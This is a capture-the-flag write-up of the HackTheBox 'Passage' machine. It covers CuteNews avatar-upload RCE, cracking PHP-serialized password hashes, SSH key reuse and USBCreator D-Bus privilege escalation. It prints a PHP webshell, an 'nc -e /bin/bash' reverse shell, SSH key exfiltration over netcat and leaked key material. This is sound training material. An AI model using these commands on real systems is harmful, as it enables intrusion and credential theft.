---
title: "HackTheBox — Passage Writeup"
date: 2021-03-10 12:15:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, passage, ctf, nmap, masscan, fail2ban, cutenews, php, reverseshell, filter-bypass, php, base64, hashcat, cracking, ssh, private-key, vim, usbcreater, arbitary-readwrite ]
image: /assets/img/Posts/Passage.png
---

> Passage starts off with web enumeration where we discover the website running on a vulnerable instance of CuteNews CMS and exploit it through bypassing Avatar Image Upload functionality to drop a PHP Web shell thereby gaining RCE. Next we recover password hashes from PHP serialized data stored in base64 encoded format, crack them and gain access to next user which shares an SSH key with another user on the box. For elevating privileges to root we exploit a bug in USBCreator D-Bus interface which allows us read/write files as root.

## Reconnaissance

Initial enumeration reveals two TCP open ports 22, 80 :

#### masscan

```shell
cfx:  ~/Documents/htb/passage
→ masscan -e tun0 -p1-65535 --rate 500 10.10.10.206 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-17 07:31:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.10.10.206
Discovered open port 22/tcp on 10.10.10.206

cfx:  ~/Documents/htb/passage
→ cat masscan.ports | grep tcp | sed s'/Discovered open port //' | awk -F/ '{print $1}' ORS=','
80,22,
```

#### nmap

```shell
cfx:  ~/Documents/htb/passage
→ nmap -sC -sV -p22,80 10.10.10.206
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-17 13:12 IST
Nmap scan report for 10.10.10.206
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

Port Scan Summary :

- Port 22 - SSH
- Port 80 - HTTP Website

### Port 80 - HTTP Website

Website looks like an blog designed to Publish news:

![website](/assets/img/Posts/Passage/website.png)

Looking at the top post, it appears they have implemented Fail2ban which prohibits us from brute-forcing the site for directory fuzzing or other kind of stuff, hence we'll skip `ffuf` and move ahead.

> Fail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks.

At the bottom of the page we see the site is `Powered by CuteNews`, while searching for CuteNews I came across this [**README**](https://cutephp.com/cutenews/readme.html) which says after installation the CMS is located at <http://yoursite.com/cutenews/index.php> similarly visiting <http://10.10.10.206/CuteNews/index.php> brings us to CuteNews login page:

![login](/assets/img/Posts/Passage/login.png)

Here we can see it's running CuteNews - 2.1.2

## Shell as www-data

### CuteNews - Exploit

`searchsploit` output shows there is a Metasploit RCE available for version 2.1.2.

```shell
cfx:  ~/Documents/htb/passage
→ searchsploit CuteNews 2.1.2
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                                | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                                    | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                        | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                                      | php/webapps/48800.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The python exploit `48800.py` was published 5 days after the box was released so rather than jumping onto it, we'll understand the RCE using the intented method by going through Metasploit exploit.

### Exploit Analysis

Looking at the Metasploit module description:

> This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in "/core/modules/dashboard.php"
Header content of the file can be changed and the control can be bypassed.
We can use the "GIF" header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE

`upload_shell` function:

```ruby
  def upload_shell(cookie, check)

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php?mod=main&opt=personal"),
      'cookie'   => cookie
    })
```

It appears the shell is being uploaded at the endpoint `/CuteNews/index.php?mod=main&opt=personal` by uploading a new Avatar with .php extension containing the shell and then executing the shell by visiting the Avatar URL.

### AutoExploit - Python RCE

The Python script is pretty straightforward which drops us a webshell:

```shell
cfx:  ~/Documents/htb/passage
→ python3 48800.py



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://10.10.10.206
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: 6Jd1qfOvZG and password: 6Jd1qfOvZG

=======================================================
Sending Payload
=======================================================
signature_key: 28e86c738babfbf544fa6f85798f4604-6Jd1qfOvZG
signature_dsi: 2bdb70bfb5c5efb697ca18ea4a74007d
logged in user: 6Jd1qfOvZG
============================
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

command > whoami
www-data
```

### Manual Exploitation

#### Step 1: Registration

Going back to <http://10.10.10.206/CuteNews/index.php> we can use the register option to create an account:

![register](/assets/img/Posts/Passage/register.png)

Once registered & logged in we are redirected to the profile page:

![logged](/assets/img/Posts/Passage/logged.png)

#### Step 2: Crafting Avatar

Personal options button brings us to the `index.php?mod=main&opt=personal` which is the same endpoint as we saw in Metasploit exploit:

![personal](/assets/img/Posts/Passage/personal.png)

Getting a sample jpg image from <https://file-examples.com/index.php/sample-images-download/sample-jpg-download/> and using `exiftool` to inject php webshell in comments section of the image:

```shell
→ exiftool -comment='<?php echo SYSTEM($_GET['cfx']); ?>' cold.jpg
    1 image files updated

cfx:  ~/Documents/htb/passage
→ strings cold.jpg | grep php
#<?php echo SYSTEM($_GET[cfx]); ?>
```

Now we'll rename our jpg and append a .php extension which will confuse the site to accept it as a jpg at the same time process the image as PHP file, we could also intercept the request in burp and change the file extension to cold.php and still the site would accept & upload the avatar:

```shell
cfx:  ~/Documents/htb/passage
→ mv cold.jpg cold.jpg.php
```

#### Step 3: Upload Avatar

Once uploaded, we can see the avatar is now broken and is not rendering the image:

![avatar](/assets/img/Posts/Passage/avatar.png)

#### Step 4: Triggering PHP WebShell

Right click the Avatar -> View Image brings us to the Avatar location <http://passage.htb/CuteNews/uploads/avatar_cfx_cold.jpg.php>, we can add `passage.htb` to `/etc/hosts` and the Image contents are now visible:

Adding our WebShell parameter and visiting the URL <http://passage.htb/CuteNews/uploads/avatar_cfx_cold.jpg.php?cfx=id>

![rce](/assets/img/Posts/Passage/rce.png)

Bingo ! We have the RCE ready.

#### Step 5:  Getting Reverse Shell

Sending Reverse shell payload <http://passage.htb/CuteNews/uploads/avatar_cfx_cold.jpg.php?cfx=nc -e /bin/bash 10.10.14.20 8020>

Getting a callback on `nc` listener:

```shell
cfx:  ~/Documents/htb/passage
→ nc -lvnp 8020
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:45416.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

Upgrading to a full TTY:

```shell
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@passage:/var/www/html/CuteNews/uploads$ ls
ls
avatar_cfx_cold.jpg.php  avatar_egre55_ykxnacpt.php  avatar_hacker_jpyoyskt.php
www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 44
stty rows 44
www-data@passage:/var/www/html/CuteNews/uploads$ stty columns 190
stty columns 190
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
export TERM=xterm
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
[1]+  Stopped                 nc -lvnp 8020

cfx:  ~/Documents/htb/passage
→ stty raw -echo

cfx:  ~/Documents/htb/passage
→ nc -lvnp 8020

www-data@passage:/var/www/html/CuteNews/uploads$ ls
avatar_cfx_cold.jpg.php  avatar_egre55_ykxnacpt.php  avatar_hacker_jpyoyskt.php
```

## Elevating Priv: www-data -> paul

### Enumeration

Discovering troll files inside cdata:

```shell
www-data@passage:/var/www/html/CuteNews/cdata$ ls
Default.tpl    auto_archive.db.php  cache            comments.txt  confirmations.php  flood.txt       ipban.db.php  news.txt    postponed_news.txt  rss_config.php       users
Headlines.tpl  backup               cat.num.php      conf.php      csrf.php           idnews.db.php   log           newsid.txt  replaces.php        template             users.db.php
archives       btree                category.db.php  config.php    flood.db.php       installed.mark  news          plugins     rss.tpl             unapproved_news.txt  users.txt
www-data@passage:/var/www/html/CuteNews/cdata$ cat users.db.php
<?php die("You don't have access to open this file!"); ?>
www-data@passage:/var/www/html/CuteNews/cdata$ cat users.txt
qc4fs7:1
qc4fxg:2
qc4fyp:3
qc4fzh:3
qfwgzt:4
qfy7jk:4
qppjyv:4
qppl2w:4
```

### Fetching Password Hashes

Inside `/cdata/users` directory we find multiple php files containing base64 encoded data:

```shell
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat lines
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
[..SNIP..]
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 07.php
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTg6IkQzSVJSdFc0WWRAaGFjay5tZSI7czoxMDoiRDNJUlJ0VzRZZCI7fX0=
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 0a.php
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
```

Instead of going through each file, we'll make use of `grep` and some bash functions to sort out this data:

```shell
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v 'php die'
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6
[..SNIP..]
```

Looks like these files are containing base64 encoded data, Next we'll decode the data line by line

```shell
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v 'php die' | while read line; do echo $line | base64 -d; echo; done
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}
a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}
a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}
a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}
a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}
a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}
a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}
a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
```

Appears to be PHP serialized data, Interestingly it does have the `pass` parameter containing password hash.

Looking at a sample hash, it's containing 64 characters, so let's again make use of grep and fetch the hashes containing 64 characters.

```shell
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v 'php die' | while read line; do echo $line | base64 -d; echo; done | grep -oP [a-z0-9]{64}
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
```

### Cracking hashes

Let's map usernames against these hashes referring `nick` & `email` parameter of serialized data and store these hashes in a file:

```shell
cfx:  ~/Documents/htb/passage
→ cat hashes
nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
sid:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
kim:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
```

Identifying the hashcat mode:

```shell
cfx:  ~/Documents/htb/passage
→ hashid -m '7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1'
Analyzing '7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1'
[+] Snefru-256
[+] SHA-256 [Hashcat Mode: 1400]
[+] RIPEMD-256
[+] Haval-256
[+] GOST R 34.11-94 [Hashcat Mode: 6900]
[+] GOST CryptoPro S-Box
[+] SHA3-256 [Hashcat Mode: 5000]
[+] Skein-256
[+] Skein-512(256)
```

Possibly the hash type is SHA-256 which is 1400 hashcat mode

```shell
cfx:  ~/Documents/htb/passage
→ hashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt --username --show
paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
```

We got the password for paul as `atlanta1`

### su - paul

```shell
www-data@passage:/var/www$ su paul -
Password:
paul@passage:/var/www$ cd ~
paul@passage:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  user.txt  Videos
```

Grabbing `user.txt`:

```shell
paul@passage:~$ cat user.txt
a456f9e6439dffd*****************
```

## Elevating Priv: paul -> nadav

### SSH access

We are unable to SSH as paul as it requires auth key.

```shell
cfx:  ~/Documents/htb/passage
→ ssh paul@10.10.10.206
paul@10.10.10.206: Permission denied (publickey).
```

Grabbing Paul's SSH key:

```shell
paul@passage:~/.ssh$ base64 id_rsa | nc -w 5 10.10.14.11 8050

cfx:  ~/Documents/htb/passage
→ nc -lvnp 8050 | base64 -d > id_rsa
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8050
Ncat: Listening on 0.0.0.0:8050
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:33184.
```

Now we can SSH as paul using the private key

```shell
cfx:  ~/Documents/htb/passage
→ chmod 600 id_rsa

cfx:  ~/Documents/htb/passage
→ ssh -i id_rsa paul@10.10.10.206
paul@passage:~$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```

### Enumeration

Going around the ssh directory we find something weirdly interesting:

```shell
paul@passage:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
paul@passage:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage

```

The entry at the end say `nadav@passage` which makes us wonder whether it's a shared key concept.

### SSH - nadav

Using the same key to SSH as nadav:

```shell
cfx:  ~/Documents/htb/passage
→ ssh -i id_rsa nadav@10.10.10.206
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$
```

## Elevating Priv: nadav -> root

User nadav is member of quite some groups including `sudo`:

Unfortunately we can't sudo as it requires password.

```shell
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

nadav@passage:~$ sudo -l
[sudo] password for nadav:
Sorry, try again.
[sudo] password for nadav:

```

### Enumeration

Inside nadav's home directory we discover `.viminfo` which is typically vim's cache kind of file:

```shell
nadav@passage:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        "       12      7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        "       2       0
        .       2       0
        +       2       0
```

Looking at the viminfo we see the user interacted with two file and both of them are owned by root:

```shell
nadav@passage:~$ ls -la /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-rw-r--r-- 1 root root 766 Apr 29  2015 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-rw-r--r-- 1 root root  65 Jan 15  2019 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
```

A quick google on `ubuntu usb creater exploit` brings us to this [**article**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) from Palo Alto

As per the article:

> Vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root.

Apparently to exploit this bug we just need to be in sudo group, which we are already.

Referring the article we'll use the command used at the end of the article to copy root's SSH key data to another file.

```shell
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/coldfx true
()
```

Checking if the file is created:

```shell
nadav@passage:~$ cd /tmp/
nadav@passage:/tmp$ ls -la coldfx
-rw-r--r-- 1 root root 1675 Mar  9 11:22 coldfx
nadav@passage:/tmp$ cat coldfx
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
+WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
[..SNIP..]
```
It worked !! A file is created with root's id_rsa owned by root but readable by us as well.

Transferring the key to our machine to SSH as root.

### SSH - root

```shell
cfx:  ~/Documents/htb/passage
→ chmod 600 root-id_rsa

cfx:  ~/Documents/htb/passage
→ ssh -i root-id_rsa root@10.10.10.206
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# whoami; date
root
Tue Nov 17 02:07:40 PST 2020
```

Grabbing `root.txt`:

```shell
root@passage:~# cat root.txt
0811a74c5b64843*****************
```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
